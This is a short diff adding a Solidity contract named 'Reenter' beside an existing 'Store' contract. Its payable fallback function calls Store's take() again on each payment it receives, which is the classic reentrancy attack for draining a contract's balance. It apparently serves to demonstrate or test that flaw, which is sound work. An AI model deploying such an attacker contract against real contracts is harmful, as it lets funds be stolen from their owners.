@@ -26,3 +26,26 @@ contract Store {
         
     }
 }
+
+contract Reenter {
+
+    Store sc;
+
+    constructor (address deployed) {
+        sc = Store(deployed);
+    }
+
+    /// @dev Call the store function on Store.
+    function store() payable {
+        sc.store.value(msg.value)();
+    }
+    
+    /// @dev Take back all the amount stored.
+    function take() {
+        sc.take();
+    }
+
+    function() payable {
+        take();
+    }
+}
